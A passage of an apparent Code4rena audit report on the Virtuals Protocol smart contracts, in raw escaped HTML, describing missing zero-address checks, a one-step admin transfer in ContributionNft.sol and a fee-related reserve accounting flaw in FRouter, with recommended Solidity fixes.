1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd validation checks to ensure the agent ID exists and the TBA address is not the zero address before transferring tokens:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"132\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Inside both prompt() and promptMulti() functions\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid agentId\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis simple check will prevent tokens from being accidentally burned due to invalid agent IDs, protecting users from permanent loss of funds.\u003c/p\u003e\n\u003ch2 id=\"04-risky-one-step-admin-transfer-in-contributionnftsol\" style=\"position:relative;\"\u003e\u003ca href=\"#04-risky-one-step-admin-transfer-in-contributionnftsol\" aria-label=\"04 risky one step admin transfer in contributionnftsol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[04] Risky one-step admin transfer in \u003ccode\u003eContributionNft.sol\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eThe \u003ccode\u003eContributionNft\u003c/code\u003e contract implements a one-step admin transfer pattern via the \u003ccode\u003esetAdmin\u003c/code\u003e function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"133\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only admin can set admin\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis approach is risky because it allows the current admin to immediately and irreversibly transfer admin rights to any address in a single transaction. If the admin address is mistyped, set to an address incapable of transaction signing, or set to the zero address, the contract’s admin privileges can be permanently lost. There is no confirmation or acceptance required from the new admin, increasing the risk of accidental or malicious loss of control.\u003c/p\u003e\n\u003ch3 id=\"impact-18\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-18\" aria-label=\"impact 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePermanent loss of admin privileges if the address is set incorrectly.\u003c/li\u003e\n\u003cli\u003eNo guarantee that the new admin can or will manage the contract.\u003c/li\u003e\n\u003cli\u003eNo way to recover admin rights if transferred to an invalid address.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/contribution/ContributionNft.sol#L103-L106\"\u003eContributionNft.sol#L103-L106\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"134\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only admin can set admin\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-34\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-34\" aria-label=\"recommended mitigation steps 34 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdopt a two-step admin transfer process, similar to OpenZeppelin’s \u003ccode\u003eOwnable2Step\u003c/code\u003e pattern. This involves:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe current admin proposes a new admin address (\u003ccode\u003etransferAdmin\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eThe new admin must explicitly accept the role in a separate transaction (\u003ccode\u003eacceptAdmin\u003c/code\u003e).\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThis ensures that admin control is only transferred to an address that is able and willing to accept the role, and prevents accidental or malicious loss of admin privileges.\u003c/p\u003e\n\u003ch3 id=\"example-mitigation\" style=\"position:relative;\"\u003e\u003ca href=\"#example-mitigation\" aria-label=\"example mitigation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eExample mitigation\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"135\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprivate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pendingAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only admin can transfer admin\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;New admin cannot be zero address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pendingAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Emit event for the pending transfer\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eacceptAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pendingAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only pending admin can accept role\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pendingAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pendingAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Emit event for the completed transfer\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis pattern ensures that admin rights are only transferred to a valid and responsive address, reducing the risk of accidental or permanent loss of control.\u003c/p\u003e\n\u003ch2 id=\"05-fee-induced-reserve-inconsistency-in-frouter\" style=\"position:relative;\"\u003e\u003ca href=\"#05-fee-induced-reserve-inconsistency-in-frouter\" aria-label=\"05 fee induced reserve inconsistency in frouter permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[05] Fee-induced reserve inconsistency in \u003ccode\u003eFRouter\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eIn the \u003ccode\u003eFRouter\u003c/code\u003e contract, swap fees are deducted from the output amount after the swap amount is calculated using the reserves, but these fees are not accounted for in the reserve updates. This creates a discrepancy between the protocol’s internal reserve accounting and the actual token balances held by the pair contract after each trade.\u003c/p\u003e\n\u003ch3 id=\"root-cause-1\" style=\"position:relative;\"\u003e\u003ca href=\"#root-cause-1\" aria-label=\"root cause 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRoot cause\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eThe router calculates the swap output using the reserves and then deducts the fee from the output amount, transferring the fee separately to the tax vault.\u003c/li\u003e\n\u003cli\u003eHowever, the pair contract’s reserves are updated based on the pre-fee output, not the net output actually received by the user.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FRouter.sol#L113-L124\"\u003eFRouter.sol#L113-L124\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"136\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAmountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esellTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etaxVault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan 